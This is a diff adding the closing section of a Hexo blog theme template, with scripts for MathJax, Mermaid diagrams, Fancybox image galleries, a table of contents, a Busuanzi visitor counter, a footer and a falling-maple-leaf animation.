+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+  });
+</script>
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+<script>
+  $(document).ready(() => {
+    const maraidConfig = {
+      theme: "default",
+      logLevel: 3,
+      flowchart: { curve: "linear" },
+      gantt: { axisFormat: "%m/%d/%Y" },
+      sequence: { actorMargin: 50 },
+    };
+    mermaid.initialize(maraidConfig);
+  });
+</script>
+
+
+
+<script src="/lib/fancybox/fancybox.umd.min.js"></script>
+
+<script>
+  $(document).ready(() => {
+    $('.post-content').each(function(i){
+      $(this).find('img').each(function(){
+        if ($(this).parent().hasClass('fancybox') || $(this).parent().is('a')) return;
+        var alt = this.alt;
+        if (alt) $(this).after('<span class="fancybox-alt">' + alt + '</span>');
+        $(this).wrap('<a class="fancybox-img" href="' + this.src + '" data-fancybox=\"gallery\" data-caption="' + alt + '"></a>')
+      });
+      $(this).find('.fancybox').each(function(){
+        $(this).attr('rel', 'article' + i);
+      });
+    });
+
+    Fancybox.bind('[data-fancybox="gallery"]', {
+        // options
+    })
+  })
+</script>
+
+<!-- tocbot begin -->
+
+<script src="/lib/tocbot/tocbot.min.js"></script>
+
+<script>
+  $(document).ready(() => {
+      tocbot.init({
+        // Where to render the table of contents.
+        tocSelector: '.post-toc',
+        // Where to grab the headings to build the table of contents.
+        contentSelector: '.post-content',
+        // Which headings to grab inside of the contentSelector element.
+        headingSelector: 'h1, h2, h3',
+        // For headings inside relative or absolute positioned containers within content.
+        hasInnerContainers: true,
+    });
+  })
+</script>
+<!-- tocbot end -->
+
+
+  </main>
+  <footer class="flex flex-col h-40 items-center justify-center text-gray-400 text-sm">
+  <!-- busuanzi -->
+  
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<!-- Busuanzi Analytics -->
+<div class="flex items-center gap-2">
+  <span>Visitors</span>
+  <span id="busuanzi_value_site_uv"></span>
+  <span>Page Views</span>
+  <span id="busuanzi_value_site_pv"></span>
+</div>
+<!-- End Busuanzi Analytics -->
+
+
+  <!-- copyright -->
+  <div class="flex items-center gap-2">
+    <a target="_blank" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" style="color: inherit;">CC BY-NC-SA 4.0</a>
+    <span>© 2023</span>
+    <iconify-icon width="18" icon="emojione-monotone:maple-leaf" ></iconify-icon>
+    <a href="https://github.com/hehanzzz" target="_blank" rel="noopener noreferrer">Hehanzzz</a>
+  </div>
+  <!-- powered by -->
+  <div class="flex items-center gap-2">
+    <span>Powered by</span>
+    <a href="https://hexo.io/" target="_blank" rel="noopener noreferrer">Hexo</a>
+    <span>&</span>
+    <a href="https://github.com/hehanzzz" target="_blank" rel="noopener noreferrer">Maple</a>
+  </div>
+
+</footer>
+
+  <div class="back-to-top box-border fixed right-6 z-1024 -bottom-20 rounded py-1 px-1 bg-slate-900 opacity-60 text-white cursor-pointer text-center dark:bg-slate-600">
+    <span class="flex justify-center items-center text-sm">
+      <iconify-icon width="18" icon="ion:arrow-up-c" id="go-top"></iconify-icon>
+      <span id="scrollpercent"><span>0</span> %</span>
+    </span>
+  </div>
+  
+<script src="/js/main.js"></script>
+
+
+  <script>
+    $(document).ready(function () {
+      const mapleCount = "10";
+      const speed = "0.5";
+      const mapleEl = document.getElementById("maple");
+      const maples = Array.from({ length: mapleCount }).map(() => {
+        const maple = document.createElement("div");
+        const scale = Math.random() * 0.5 + 0.5;
+        const offset = Math.random() * 2 - 1;
+        const x = Math.random() * mapleEl.clientWidth;
+        const y = -Math.random() * mapleEl.clientHeight;
+        const duration = 10 / speed;
+        const delay = -duration;
+        maple.className = "maple";
+        maple.style.width = `${24 * scale}px`;
+        maple.style.height = `${24 * scale}px`;
+        maple.style.left = `${x}px`;
+        maple.style.top = `${y}px`;
+        maple.style.setProperty("--maple-fall-offset", offset);
+        maple.style.setProperty("--maple-fall-height", `${Math.abs(y) + mapleEl.clientHeight}px`);
+        maple.style.animation = `fall ${duration}s linear infinite`;
+        maple.style.animationDelay = `${delay}s`;
+        mapleEl.appendChild(maple)
+        return maple
+      })
+    });
+  </script>
+  
+
+
+  <div class="fixed top-0 bottom-0 left-0 right-0 pointer-events-none print:hidden" id="maple"></div>
+</body>
+
+</html>
